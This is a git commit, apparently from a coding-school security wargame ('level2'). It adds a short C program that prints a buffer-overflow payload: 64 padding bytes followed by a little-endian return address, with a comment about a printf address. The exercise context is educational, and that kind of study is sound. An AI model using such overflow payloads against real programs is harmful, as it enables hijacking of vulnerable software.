05bf2451a90746db9e539038ca69558ac2b29483
Arthur Bourbousson <abourbou@z3r7p3.42lyon.fr>
2022-04-12 10:46:10 +0200

    level2

---
+++ level2/Ressources/print.c
@@ -0,0 +1,7 @@
+#include <stdio.h>
+
+int main ()
+{
+	//64A and the address of the printf 0x804854a
+    printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08"); 
+}
